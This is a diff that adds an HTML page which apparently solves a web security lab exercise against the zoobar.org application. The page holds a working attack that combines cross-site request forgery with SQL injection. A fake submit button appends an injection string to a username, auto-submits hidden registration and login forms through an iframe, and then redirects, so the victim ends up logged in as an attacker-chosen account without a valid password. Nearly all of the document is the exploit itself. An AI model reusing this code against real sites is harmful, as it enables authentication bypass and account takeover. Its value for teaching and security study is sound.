@@ -1,0 +1,60 @@
+<html>
+  <head>
+    <title> </title>
+  </head>
+
+  <body>
+
+    <input type="text" name="input_username" value="james" id="input_username">
+    <input type="submit" name="fake_button" value="Submit" id="fake_button" onClick="execute()">
+
+    <form name="attack_c" target="form_target" action="http://zoobar.org/index.php" method="post">
+      <input id="login_username" type="hidden" name="login_username" value="">
+      <input id="login_password" type="hidden" name="login_password" value="password">
+      <input id="submit_login" type="submit" name="submit_login" value="Login">
+      <input id="submit_registration" type="submit" name="submit_registration" value="Register">
+    </form>
+
+
+
+    <iframe name="form_target" width="700" height="500" style="visibility: visible" onLoad="iframe_onload()">
+    </iframe>
+
+    
+    <script>
+  
+      var login_flag = false;
+      var redirect_flag = false;
+
+
+      function execute()
+      {
+        login_flag = true;
+
+        var username_textbox = document.getElementById("login_username");
+        var input_textbox = document.getElementById("input_username");
+        
+        username_textbox.value = input_textbox.value + "';--";
+
+        document.getElementById("submit_registration").click();
+      }
+
+      function iframe_onload()
+      {
+        if(login_flag) {
+          login_flag = false;
+          redirect_flag = true;
+          document.getElementById("submit_login").click();
+        }
+
+        else if(redirect_flag) {
+          window.location.assign("http://zoobar.org/index.php");
+        }
+      }
+
+    </script>
+
+  </body>
+</html>
+
+<!-- vim: set shiftwidth=2 tabstop=2 : -->
